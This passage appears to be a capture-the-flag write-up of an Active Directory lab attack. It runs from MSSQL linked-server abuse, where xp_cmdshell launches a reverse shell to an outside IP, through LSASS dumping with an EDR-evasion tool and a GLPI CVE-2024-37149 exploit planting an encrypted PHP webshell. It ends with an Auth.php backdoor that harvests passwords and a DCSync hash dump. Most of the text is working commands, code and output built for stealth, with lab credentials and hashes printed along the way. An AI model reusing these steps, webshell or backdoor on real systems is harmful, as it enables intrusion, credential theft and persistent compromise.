Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
gringotts01     spellbook                   0   sa
```

The database is configured to be using trusted link from gringotts01 to gringotts02.
Using the link, the SQL requests will be executed as `sa`, which is the most privileged MSSQL local account.
Meaning that `xp_cmdshell` procedure can be activated.

# SQL01

## RCE

```bash
SQL (spellbook  spellbook@spellbook)> use_link gringotts01
SQL >gringotts01 (sa  dbo@spellbook)> enable_xp_cmdshell
```

## PrivEsc

Once activated, arbitrary commands can be executed.
As the MSSQL service is always running with account that has `SEImpersonatePrivilege`, it means that one can take advantage of that privilege to perform privilege escalation.
To do this, [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/) will the used.

Once compiled, transfer it to the compromised server to not perform external HTTP requests, in order to be stealthier.

```bash
$ sshpass -p '?8@XdCNymdoH5CkgigiL' scp -P 8888 update.exe 127.0.0.1:/var/www/secretnotes/public/update.exe
```

Confirm that the file was transfered and accessible.

```bash
$ sshpass -p '?8@XdCNymdoH5CkgigiL' ssh 127.0.0.1 -p 8888 -T -C 'ls -al /var/www/secretnotes/public/update.exe'
-rwxr-xr-x 1 www-data www-data 63488 Nov 12 22:43 /var/www/secretnotes/update.exe

$ pc -q curl http://192.168.56.200:8000/update.exe
Warning: Binary output can mess up your terminal. Use "--output -" to tell
```

Now download and exploit the `SEImpersonatePrivilege`.

```bash
SQL >gringotts01 (sa  dbo@spellbook)> xp_cmdshell curl -o "C:\tools\update1.exe" http://192.168.56.200:8000/update.exe
SQL >gringotts01 (sa  dbo@spellbook)> xp_cmdshell cmd /c "C:\tools\update1.exe --revshell 51.75.120.170 445"
```

The exploit gave us a reverse shell as `NT AUTHORITY\System`, meaning that `GRINGOTTS01` is fully compromised.

```bash
$ sudo setcap 'cap_net_bind_service=+ep' /bin/nc.openbsd
$ nc -lvnkp 445
whoami
nt authority\system
```

## Dump LSASS

Interesting thing to do once compromised a machine is to take a look at interactive authenticated users.

```bash
PS C:\Windows\system32> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           neville.longbottom        1  Active
 rdp-tcp                                 65536  Listen
```

Here, `neville.longbottom` is logged on.
Meaning that dumping `lsass.exe` process memory will contains his hashed credentials.
To do so, EDRSandblast will be used.

```bash
$ git clone https://github.com/wavestone-cdt/EDRSandblast
```

The tool needs to be compiled and then pushed into the compromised machine.
The tool takes advantage of vulnerable windows signed driver.

```bash
$ curl -L https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/c996d7971c49252c582171d9380360f2.bin -o dbus.sys
$ sshpass -p '?8@XdCNymdoH5CkgigiL' scp -P 8888 dbus.sys 127.0.0.1:/var/www/secretnotes/public/dbus.sys
$ sshpass -p '?8@XdCNymdoH5CkgigiL' scp -P 8888 upgrade.exe 127.0.0.1:/var/www/secretnotes/public/upgrade.exe

PS C:\Windows\system32> curl -o "upgrade.exe" http://192.168.56.200:8000/upgrade.exe
PS C:\Windows\system32> curl -o "dbus.sys" http://192.168.56.200:8000/dbus.sys
PS C:\Windows\system32> .\upgrade.exe dump -i -o C:\Windows\Temp\ntdll32.exe --vuln-driver dbus.sys --usermode

[===== USER MODE =====]

[+] Detecting userland hooks in all loaded DLLs...
[+] [Hooks]     upgrade.exe (C:\Windows\SysWOW64\upgrade.exe): 0x00007FF628610000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ntdll.dll (C:\Windows\SYSTEM32\ntdll.dll): 0x00007FF8932F0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     KERNEL32.DLL (C:\Windows\System32\KERNEL32.DLL): 0x00007FF891AA0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     KERNELBASE.dll (C:\Windows\System32\KERNELBASE.dll): 0x00007FF88FA70000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     apphelp.dll (C:\Windows\SYSTEM32\apphelp.dll): 0x00007FF88D290000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     SHLWAPI.dll (C:\Windows\System32\SHLWAPI.dll): 0x00007FF891C40000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     msvcrt.dll (C:\Windows\System32\msvcrt.dll): 0x00007FF891D30000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     combase.dll (C:\Windows\System32\combase.dll): 0x00007FF8920D0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ucrtbase.dll (C:\Windows\System32\ucrtbase.dll): 0x00007FF88F580000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     RPCRT4.dll (C:\Windows\System32\RPCRT4.dll): 0x00007FF892B90000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     bcryptPrimitives.dll (C:\Windows\System32\bcryptPrimitives.dll): 0x00007FF88FD40000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     GDI32.dll (C:\Windows\System32\GDI32.dll): 0x00007FF891FF0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     gdi32full.dll (C:\Windows\System32\gdi32full.dll): 0x00007FF88F370000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     msvcp_win.dll (C:\Windows\System32\msvcp_win.dll): 0x00007FF88F8D0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     USER32.dll (C:\Windows\System32\USER32.dll): 0x00007FF891E50000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     win32u.dll (C:\Windows\System32\win32u.dll): 0x00007FF88F680000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ADVAPI32.dll (C:\Windows\System32\ADVAPI32.dll): 0x00007FF892D80000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     sechost.dll (C:\Windows\System32\sechost.dll): 0x00007FF892AF0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ole32.dll (C:\Windows\System32\ole32.dll): 0x00007FF892E30000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     OLEAUT32.dll (C:\Windows\System32\OLEAUT32.dll): 0x00007FF891B70000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     CRYPT32.dll (C:\Windows\System32\CRYPT32.dll): 0x00007FF88F6A0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     MSASN1.dll (C:\Windows\System32\MSASN1.dll): 0x00007FF88F2A0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     VERSION.dll (C:\Windows\SYSTEM32\VERSION.dll): 0x00007FF886320000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     dbghelp.dll (C:\Windows\SYSTEM32\dbghelp.dll): 0x00007FF8826F0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     WINHTTP.dll (C:\Windows\SYSTEM32\WINHTTP.dll): 0x00007FF8867B0000
[+] [Hooks]             No hooks found in this module.
[+] Process is "safe" to launch our payload
[+] Attempting to dump the process
[+] lsass.exe sucessfully dumped to: C:\Windows\Temp\ntdll32.exe
```

The dump seems to be complete, now it's time to retrieve it.

```bash
SQL >gringotts01 (sa  dbo@spellbook)> download C:\Windows\Temp\ntdll32.exe lsass.dump
[+] File exists, downloading...
[+] Writing file to disk...
[+] Downloaded
```

Finally, parse the dump to retrieve `neville.longbottom`'s NT hash.

```bash
$ pypykatz lsa minidump lsass.dump -g

filename:packagename:domain:user:NT:LM:SHA1:masterkey:sha1_masterkey:key_guid:plaintext
lsass.dump:msv:hogwarts:bogrod.svc:3662cf9e7cc672037b05c7a4e74b4484::b4fa98f8cc50991d52a9e9d5cb7efafc6cbd6676::::
lsass.dump:msv:hogwarts:neville.longbottom:6b8e43bdb9d3aa076836ff8ad1ccf32a::f2668281af0c06781c3b6401d1887e6c20b7ab65::::
```

## Lateral movement

```bash
$ pc -q  ldeep ldap -s ldap://192.168.56.100 -d hogwarts -u neville.longbottom -H ':6b8e43bdb9d3aa076836ff8ad1ccf32a' object neville.longbottom -v

[...]
  "distinguishedName": "CN=neville.longbottom,OU=Students,OU=Hogwarts,DC=hogwarts,DC=local",
  "dn": "CN=neville.longbottom,OU=Students,OU=Hogwarts,DC=hogwarts,DC=local",
  "givenName": "Neville",
  "instanceType": 4,
  "l": "Longbottom House",
  "lastLogoff": "1601-01-01T00:00:00+00:00",
  "lastLogon": "1601-01-01T00:00:00+00:00",
  "lastLogonTimestamp": "2025-11-22T21:47:48.495962+00:00",
  "logonCount": 1,
  "memberOf": [
    "CN=Pensive,OU=Pensive,OU=Hogwarts,DC=hogwarts,DC=local",
    "CN=Gryffindor,OU=Houses,OU=Hogwarts,DC=hogwarts,DC=local"
  ],
```

This user seems to be member of a special group: `Pensive`.

# GLPI01

## CVE-2024-37149

Since stealth operations are considered, one have to download source code and apply modifications.

```bash
$ git clone https://github.com/Orange-Cyberdefense/glpwnme && cd glpwnme
$ virtualenv venv
$ source venv/bin/activate
$ pip3 install -r requirements.txt
```

`shell.php`'s webshell has been modified to be stealthier by renaming variables and added encryption mechanism to avoid decrypting on the fly webshell argument.
Example using `whoami`.

```php
$key = "14ac4b90bd3f880e741a85b0c6254d1f";
$iv  = "5cf025270d8f74c9";

if(isset($_GET["save_result"]) && !empty($_GET["save_result"]))
{
    $output=null;
    $retval=null;

    $encrypted = base64_decode($_GET['save_result']);
    $decrypted = openssl_decrypt($encrypted, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);

    exec($decrypted, $output, $retval);
```

Once ready, the exploitation can be performed.
It will plant a webshell using a path traversal vulnerability.

```bash
$ pc -q glpwnme -t https://192.168.56.230 --auth ldap-1 --profile Super-Admin -u neville.longbottom -p 'MimbulusMimbletonia5' -e CVE_2024_37149 --run

[+] Version of glpi found: 10.0.15
[+] GLPI API is disable
[+] Inventory is disable
[+] Profiles of current user: Self-Service, Super-Admin
[!] Do not forget to clean your exploit, click on the broom 🧹
[+] Found glpi_tmp_dir: /var/www/glpi/files/_tmp
[!] Uploading backdoor..
[-] Got error: Filetype not allowed
[!] Adding php extension on the target
[+] Files uploaded https://192.168.56.230/files/_tmp/setup.php !
[!] Setting up LFI...
[+] Config rights shall have been updated to 31
[!] Adding malicious plugin form_submit
[+] Plugin form_submit created !
[+] Plugin id: 1
[!] https://192.168.56.230/front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=#<whoami|optionnal>
[+] Config rights shall have been updated to 3
```

Browsing the following link https://192.168.56.230/front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== returns `www-data`.
Meaning that the webshell is working properly.

## Authentication backdoored

The code responsible for the GLPI's authentication is located at `/var/www/glpi/src/Auth.php`.
To backdoor the authentication, we'll capture submitted login and password to write them in pre-authenticated accessible file `/var/www/glpi/pics/screenshots/example.gif`.
In order to do that, the following code will be used:

```php
$key = "ec6c34408ae2523fe664bd1ccedc9c28";
$iv  = "ecb2b0364290d1df";

$data = json_encode([
    'login' => $login_name,
    'password' => $login_password,
]);

$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$encoded = base64_encode($encrypted) . ";";

$file = "/var/www/glpi/pics/screenshots/example.gif";
file_put_contents($file, $encoded, FILE_APPEND);
```

To backdoor the authenticated, the `Auth.php` will be overwritten.

```bash
$ echo -n "curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php" | openssl enc -aes-256-cbc -K 3134616334623930626433663838306537343161383562306336323534643166 -iv 35636630323532373064386637346339 -nosalt -a -A

4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=
```

Finally the overwrite is performed by browsing the following link, according to RCE method: https://192.168.56.230/front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=

## Retrieve authentication success

After a bit of waiting, credentials can be looted:

```bash
$ pc -q curl -k https://192.168.56.230/pics/screenshots/example.gif
mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;

$ echo "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==" | openssl enc -aes-256-cbc -d -K 6563366333343430386165323532336665363634626431636365646339633238 -iv 65636232623033363432393064316466 -nosalt -a -A
{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}

$ echo "mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K" | openssl enc -aes-256-cbc -d -K 6563366333343430386165323532336665363634626431636365646339633238 -iv 65636232623033363432393064316466 -nosalt -a -A
{"login":"Flag","password":"Hero{FakeFlag:(}"}
```

Once unciphered, they reveal domain's administrator cleartext credentials.

# DC01

## DCSync

Using the previously looted credentials, users' credentials can be looted trough domain synchronise mechanism: DCSync.

```bash
$ pc -q nxc smb 192.168.56.100 -d 'hogwarts' -u 'albus.dumbledore' -p 'FawkesPhoenix#9!' --ntds
SMB         192.168.56.100  445    MINISTRY         [*] Windows 10 / Server 2019 Build 17763 x64 (name:MINISTRY) (domain:hogwarts.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    MINISTRY         [+] hogwarts\albus.dumbledore:FawkesPhoenix#9! (Pwn3d!)
SMB         192.168.56.100  445    MINISTRY         Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4f9932c200b45010fd0e3b50570aaab:::
SMB         192.168.56.100  445    MINISTRY         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.100  445    MINISTRY         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a815b9298e84b0c8b6fadd7ed8c30d22:::
SMB         192.168.56.100  445    MINISTRY         vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.100  445    MINISTRY         albus.dumbledore:1113:aad3b435b51404eeaad3b435b51404ee:07b78b33953c40c96606336f9025215c:::
```